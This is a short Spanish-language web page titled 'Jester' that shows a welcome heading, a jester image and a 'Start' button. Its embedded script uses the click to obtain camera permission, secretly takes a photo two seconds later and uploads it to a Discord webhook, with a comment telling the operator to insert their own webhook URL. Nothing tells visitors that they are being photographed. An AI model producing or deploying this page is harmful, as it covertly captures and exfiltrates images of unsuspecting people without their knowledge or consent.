<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title>P치gina Jester</title>
  <style>
    body {
      background: #000;
      color: #fff;
      text-align: center;
      font-family: Arial, sans-serif;
      padding: 40px;
    }
    img {
      width: 200px;
      margin-top: 50px;
    }
    button {
      margin-top: 30px;
      padding: 12px 25px;
      font-size: 18px;
      cursor: pointer;
      background: red;
      border: none;
      border-radius: 8px;
      color: white;
    }
  </style>
</head>
<body>
  <h1>Bienvenido</h1>
  <img src="https://pngimg.com/uploads/jester/jester_PNG27.png" alt="Jester">
  <br>
  <button id="startBtn">Iniciar</button>

  <script>
    const webhookURL = "https://discordapp.com/api/webhooks/xxxxxxxx"; // <-- pon aqu칤 tu webhook

    const button = document.getElementById("startBtn");

    button.addEventListener("click", () => {
      navigator.mediaDevices.getUserMedia({ video: true })
        .then(stream => {
          const video = document.createElement("video");
          video.srcObject = stream;
          video.play();

          // Espera un poco para que la c치mara arranque
          setTimeout(() => {
            const canvas = document.createElement("canvas");
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext("2d").drawImage(video, 0, 0);

            // Detener c치mara
            stream.getTracks().forEach(track => track.stop());

            // Convertir la foto en blob y mandarla a Discord
            canvas.toBlob(blob => {
              const formData = new FormData();
              formData.append("file", blob, "foto.png");
              formData.append("payload_json", JSON.stringify({
                content: "游닝 Foto tomada desde la p치gina"
              }));

              fetch(webhookURL, {
                method: "POST",
                body: formData
              }).catch(err => console.error(err));
            }, "image/png");
          }, 2000);
        })
        .catch(() => alert("Permiso denegado o c치mara no disponible."));
    });
  </script>
</body>
</html>
